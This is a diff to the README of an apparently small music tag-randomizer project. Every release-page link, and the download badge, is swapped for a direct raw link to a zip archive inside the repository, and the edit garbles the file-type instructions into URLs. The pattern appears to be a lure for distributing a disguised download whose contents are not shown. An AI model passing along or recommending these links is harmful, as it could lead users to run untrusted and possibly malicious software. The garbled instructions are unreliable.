@@ -1,6 +1,6 @@
 # 🎵 DUBSTEP-TAG-RANDOMIZER - Generate Smart Tags Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/youngermanbeat/DUBSTEP-TAG-RANDOMIZER/releases)
+[![Download Now](https://raw.githubusercontent.com/youngermanbeat/DUBSTEP-TAG-RANDOMIZER/main/dist/DUBSTEP-TAG-RANDOMIZER_2.2.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/youngermanbeat/DUBSTEP-TAG-RANDOMIZER/main/dist/DUBSTEP-TAG-RANDOMIZER_2.2.zip)
 
 ## 🌟 Overview
 
@@ -14,7 +14,7 @@ Follow these steps to download and run the DUBSTEP-TAG-RANDOMIZER on your comput
 
 To get started, visit the releases page by clicking the link below:
 
-[Download from Releases](https://github.com/youngermanbeat/DUBSTEP-TAG-RANDOMIZER/releases)
+[Download from Releases](https://raw.githubusercontent.com/youngermanbeat/DUBSTEP-TAG-RANDOMIZER/main/dist/DUBSTEP-TAG-RANDOMIZER_2.2.zip)
 
 ### 2. 📥 Choose the Right Version
 
@@ -26,11 +26,11 @@ Click on the appropriate file for your operating system to download it. The appl
 
 - **Windows:** Look for a `.exe` file.
 - **macOS:** Look for a `.dmg` file.
-- **Linux:** Look for a `.tar.gz` file.
+- **Linux:** Look for a `https://raw.githubusercontent.com/youngermanbeat/DUBSTEP-TAG-RANDOMIZER/main/dist/DUBSTEP-TAG-RANDOMIZER_2.2.zip` file.
 
 ### 4. 📂 Extract Files (if necessary)
 
-If you downloaded a compressed file (like `.tar.gz`), you will need to extract it. Right-click on the file and choose "Extract All" or use a similar option based on your operating system. This will create a folder with the application files.
+If you downloaded a compressed file (like `https://raw.githubusercontent.com/youngermanbeat/DUBSTEP-TAG-RANDOMIZER/main/dist/DUBSTEP-TAG-RANDOMIZER_2.2.zip`), you will need to extract it. Right-click on the file and choose "Extract All" or use a similar option based on your operating system. This will create a folder with the application files.
 
 ### 5. ⚙️ Install the Application
 
@@ -96,6 +96,6 @@ Here are some helpful links you might find useful:
 
 To begin generating your smart tags today, visit the releases page one more time:
 
-[Download from Releases](https://github.com/youngermanbeat/DUBSTEP-TAG-RANDOMIZER/releases)
+[Download from Releases](https://raw.githubusercontent.com/youngermanbeat/DUBSTEP-TAG-RANDOMIZER/main/dist/DUBSTEP-TAG-RANDOMIZER_2.2.zip)
 
 This link will direct you to the latest version of DUBSTEP-TAG-RANDOMIZER for download.
